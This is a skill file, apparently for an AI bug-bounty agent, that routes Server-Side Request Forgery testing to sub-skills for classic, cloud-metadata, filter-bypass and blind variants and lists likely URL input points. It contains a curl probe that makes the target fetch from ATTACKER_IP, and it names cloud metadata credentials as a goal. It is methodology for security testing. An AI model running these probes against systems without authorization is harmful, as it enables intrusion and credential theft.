---
name: attack-ssrf
description: "Server-Side Request Forgery router — identify URL input points, then load the variant sub-skill (classic / cloud-metadata / filter-bypass / blind-oob)"
category: "web-application"
version: "2.0"
author: "bountyreper-official"
tags:
  - ssrf
  - web
  - injection
  - cloud
  - metadata
  - blind
tech_stack:
  - web
  - aws
  - gcp
  - azure
cwe_ids:
  - CWE-918
chains_with:
  - attack-xxe
  - attack-ssti
prerequisites: []
severity_boost:
  attack-xxe: "SSRF via XXE parser = file read + internal network scanning"
  attack-ssti: "SSRF from SSTI = full RCE chain"
---

# Server-Side Request Forgery (SSRF)

## Route first — load the variant sub-skill

SSRF has four genuinely different methodologies. Determine which you are facing, load
that sub-skill, then work from it:

| Situation | Variant | Load |
|---|---|---|
| Response shows internal data / you control the fetch target fully | Classic (internal net, file://, gopher) | `skill(action="load", name="attack-ssrf-classic")` |
| Target runs in cloud; goal is IMDS/GCP/Azure metadata credentials | Cloud metadata | `skill(action="load", name="attack-ssrf-cloud-metadata")` |
| Filters block private IPs — encodings, rebinding, redirects needed | Filter bypass | `skill(action="load", name="attack-ssrf-filter-bypass")` |
| No response body at all — confirm via callback/timing | Blind / OOB | `skill(action="load", name="attack-ssrf-blind-oob")` |

## Identify URL input points (always first, variant-agnostic)

- Webhook URLs, callback URLs (integrations settings!)
- File import/export by URL, PDF/image generation from URL
- URL preview / link unfurling (Slack-style)
- Proxy/redirect endpoints, `fetch`/`validate` APIs
- Deep-link importers (markdown `![]()` images, HTML template builders)

```bash
# Prove the fetch happens: unique marker per input point
curl "https://TARGET/api/fetch?url=http://ATTACKER_IP:8888/ssrf-marker-N"
```

## Evidence rule

- Response body with internal data → screenshot + request/response pair (confirmed)
- No body → OOB callback or timing delta is the ONLY proof — see blind-oob sub-skill
- Cloud credentials retrieved = critical, redact token values in the report

## References

- [PortSwigger: SSRF](https://portswigger.net/web-security/ssrf)
- [OWASP: SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
